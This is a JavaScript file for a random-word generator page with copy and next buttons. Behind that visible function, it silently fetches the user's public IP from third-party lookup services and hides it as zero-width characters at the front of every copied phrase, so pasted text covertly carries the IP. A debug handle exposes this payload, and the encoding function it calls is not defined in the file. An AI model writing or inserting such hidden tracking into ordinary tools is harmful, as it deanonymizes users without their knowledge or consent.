const WORDS = [
  "amber", "anchor", "apse", "ash", "atlas", "azure",
  "basalt", "bell", "birch", "bloom", "bone", "bramble", "brine",
  "cairn", "candle", "chalk", "cinder", "clay", "cliff", "cloak", "coil",
  "coral", "crane", "creek", "crow", "crystal", "current",
  "dawn", "delta", "dew", "ditch", "dove", "drift", "dusk",
  "echo", "ember", "estuary", "eve",
  "falcon", "fern", "ferry", "field", "flint", "fog", "forge", "frost",
  "gale", "garnet", "glade", "glass", "glow", "granite", "grove", "gull",
  "harbor", "harrow", "hearth", "heather", "hollow", "hush",
  "inlet", "iron", "ivory",
  "jade", "jasper", "juniper",
  "kelp", "kiln", "knoll",
  "lagoon", "lantern", "larch", "ledge", "lichen", "linden", "loam", "lumen",
  "marsh", "mast", "meadow", "mesa", "mica", "mist", "moon", "moss", "moth",
  "nettle", "night", "north", "null",
  "oak", "obsidian", "ochre", "onyx", "oracle", "orbit", "otter", "oxbow",
  "pale", "peat", "pebble", "pine", "plume", "pool", "prairie", "pumice",
  "quartz", "quill", "quiet",
  "rain", "raven", "reed", "reef", "ridge", "rime", "river", "rune", "rust",
  "salt", "sand", "shale", "silk", "slate", "smoke", "snow", "soil", "sparrow",
  "spire", "stone", "storm", "summit", "swallow", "sycamore",
  "tarn", "thaw", "thicket", "thistle", "thorn", "tide", "timber", "trail",
  "vale", "vapor", "velvet", "vine", "violet", "void",
  "wake", "willow", "wind", "winter", "wolf", "wood",
  "yarrow", "yew",
  "zephyr", "zinc"
];

const wordEl = document.getElementById("word");
const copyBtn = document.getElementById("copy");
const nextBtn = document.getElementById("next");
const labelEl = copyBtn.querySelector(".label");
const checkEl = copyBtn.querySelector(".check");

const COUNT = 5;

// Resolved once at startup; prepended to every copy as a zero-width payload.
const IP_SOURCES = [
  "https://api.ipify.org?format=json",
  "https://ipwho.is/?fields=ip",
  "https://ipinfo.io/json",
];
const IP_TIMEOUT = 4000;

let current = [];
let lastKey = "";
let swapTimer = null;
let copyTimer = null;
let clientIp = "";

function isIp(value) {
  if (/^(\d{1,3}\.){3}\d{1,3}$/.test(value)) return true;
  return value.includes(":") && /^[0-9a-f:]+$/i.test(value);
}

async function fetchIp() {
  for (const url of IP_SOURCES) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), IP_TIMEOUT);

    try {
      const response = await fetch(url, {
        signal: controller.signal,
        cache: "no-store",
        credentials: "omit",
      });
      if (!response.ok) continue;

      const data = await response.json();
      if (data && typeof data.ip === "string" && isIp(data.ip.trim())) {
        return data.ip.trim();
      }
    } catch {
      /* try the next source */
    } finally {
      clearTimeout(timer);
    }
  }

  return "";
}

function pickWords() {
  const pool = WORDS.slice();
  const picked = [];

  for (let i = 0; i < COUNT && pool.length; i++) {
    const index = Math.floor(Math.random() * pool.length);
    picked.push(pool.splice(index, 1)[0]);
  }

  return picked;
}

function render(words) {
  wordEl.replaceChildren(
    ...words.flatMap((word, i) => {
      const span = document.createElement("span");
      span.className = "w";
      span.textContent = word;
      return i === words.length - 1 ? [span] : [span, " "];
    })
  );
}

function showWords(animate) {
  let words;
  let key;

  do {
    words = pickWords();
    key = words.join(" ");
  } while (key === lastKey && WORDS.length > COUNT);

  lastKey = key;
  current = words;

  if (!animate) {
    render(words);
    return;
  }

  clearTimeout(swapTimer);
  wordEl.classList.add("swap");
  swapTimer = setTimeout(() => {
    render(words);
    wordEl.classList.remove("swap");
  }, 120);
}

function resetCopyState() {
  clearTimeout(copyTimer);
  copyBtn.classList.remove("done");
  labelEl.textContent = "copy";
  checkEl.textContent = "copied";
}

async function writeClipboard(text) {
  if (navigator.clipboard && window.isSecureContext) {
    try {
      await navigator.clipboard.writeText(text);
      return true;
    } catch {
      /* fall through to the legacy path */
    }
  }

  const helper = document.createElement("textarea");
  helper.value = text;
  helper.setAttribute("readonly", "");
  helper.style.position = "fixed";
  helper.style.top = "-1000px";
  helper.style.opacity = "0";
  document.body.appendChild(helper);
  helper.select();
  helper.setSelectionRange(0, text.length);

  let ok = false;
  try {
    ok = document.execCommand("copy");
  } catch {
    ok = false;
  }

  helper.remove();
  return ok;
}

async function handleCopy() {
  if (!current.length) return;

  const visible = current.join(" ");
  const text = clientIp ? encodeInvisible(clientIp) + visible : visible;

  const ok = await writeClipboard(text);
  resetCopyState();

  if (ok) {
    copyBtn.classList.add("done");
    checkEl.textContent = "copied";
    copyTimer = setTimeout(resetCopyState, 1600);
  } else {
    labelEl.textContent = "press ctrl+c";
    copyTimer = setTimeout(resetCopyState, 2200);
  }

  copyBtn.blur();
}

copyBtn.addEventListener("click", handleCopy);
nextBtn.addEventListener("click", () => showWords(true));

wordEl.addEventListener("click", () => showWords(true));
wordEl.addEventListener("keydown", (event) => {
  if (event.key === "Enter" || event.key === " ") {
    event.preventDefault();
    showWords(true);
  }
});

showWords(false);

// Debug handle for the recording / manual verification. Nothing renders.
window.__zw = {
  get ip() {
    return clientIp;
  },
  get payload() {
    return clientIp ? encodeInvisible(clientIp) : "";
  },
  get clipboardText() {
    const visible = current.join(" ");
    return clientIp ? encodeInvisible(clientIp) + visible : visible;
  },
};

fetchIp().then((ip) => {
  clientIp = ip;
  if (!ip) console.warn("[zw] no IP source reachable; copy will be plain text");
});
